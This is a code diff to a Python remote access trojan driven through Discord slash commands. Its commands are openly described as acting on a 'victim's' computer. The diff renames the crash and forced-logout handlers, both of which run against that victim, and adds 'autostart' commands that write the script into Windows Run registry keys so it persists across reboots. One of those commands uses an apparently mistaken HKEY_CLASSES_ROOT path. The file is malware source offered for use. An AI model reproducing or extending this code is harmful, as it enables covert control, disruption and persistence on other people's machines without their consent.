@@ -14,6 +14,7 @@ from urllib.request import Request, urlopen
 
 import discord
 import pyautogui
+import winreg
 import requests
 from discord import *
 from discord.utils import get
@@ -317,7 +318,7 @@ async def discordinfo(interaction: discord.Interaction):
 
 @bot.tree.command(name="crash",
 				  description="crash your victim's computer")
-async def geo(interaction: discord.Interaction):
+async def cr(interaction: discord.Interaction):
 	await interaction.response.send_message(f"crashing machine...")
 	await interaction.channel.send(crash())
 
@@ -412,9 +413,23 @@ async def downloadFile(interaction: discord.Interaction, targeturl: str, directo
 
 
 @bot.tree.command(name="log_out", description="log the victim out of their User account")
-async def scr(interaction: discord.Interaction):
+async def logo(interaction: discord.Interaction):
 	os.system("shutdown /l /f")
 	await interaction.response.send_message(f"Successfully logged out")
+
+
+@bot.tree.command(name="autostart_root", description="add the program to the autostart")
+async def asr(interaction: discord.Interaction, value_name: str):
+	with winreg.OpenKeyEx(winreg.HKEY_CLASSES_ROOT, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
+		winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f"python {os.path.abspath(__file__)}")
+	await interaction.response.send_message(f"Successfully added registry entry")
+
+
+@bot.tree.command(name="autostart", description="add the program to the autostart")
+async def asu(interaction: discord.Interaction, value_name: str):
+	with winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
+		winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f"python {os.path.abspath(__file__)}")
+	await interaction.response.send_message(f"Successfully added registry entry")
 
 
 bot.run(token=token)
